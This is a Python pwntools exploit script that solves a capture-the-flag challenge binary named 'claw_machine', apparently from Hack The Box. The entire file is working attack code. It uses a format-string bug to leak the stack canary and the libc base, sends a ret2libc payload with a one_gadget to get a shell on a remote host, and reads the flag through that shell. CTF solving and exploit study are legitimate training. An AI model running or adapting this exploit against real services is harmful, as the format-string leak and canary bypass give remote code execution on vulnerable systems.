#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './claw_machine' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

e      = ELF(fname)
libc   = ELF(e.runpath.decode() + 'libc.so.6')
rop    = ROP(e)

rl     = lambda     : r.recvline()
ru     = lambda x   : r.recvuntil(x)
sla    = lambda x,y : r.sendlineafter(x,y)

def fuzzer():
  context.log_level = 'critical'
  for i in range (50):
    r = process(fname)
    r.sendlineafter('>> ', '9')
    r.sendlineafter('>> ', 'y')
    r.sendlineafter('name: ', f'%{i}$p')
    r.recvuntil('giving feedback ')
    leak = r.recvline()[:-1].decode()
    if len(leak) == 14 and '0x7f' in leak:
      print(f'[{i}] Possible LIBC: {leak}')
    elif len(leak) == 18 and '00' in leak:
      print(f'[{i}] Possible CANARY: {leak}')
    r.sendline('a')
    r.close()

# Uncomment to fuzz for addresses
# fuzzer()

# fmt leaks
sla('>> ', '9')
sla('>> ', 'y')
sla('name: ', f'%21$p.%27$p')
ru('giving feedback ')
canary, libc_leak = rl()[:-1].split(b'.')
canary = canary.decode()
libc.address = int(libc_leak.decode(), 16) - 0x21c87
print(f'Canary:    {canary}\nLibc base: {libc.address:#04x}')

# ret2libc with one_gadget
payload = flat({
  72: p64(int(canary, 16)) + p64(rop.find_gadget(['ret'])[0]) +
      p64(libc.address + 0x4f2a5)
})

sla('here: ', payload)

# Print flag
pause(1)
r.sendline('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')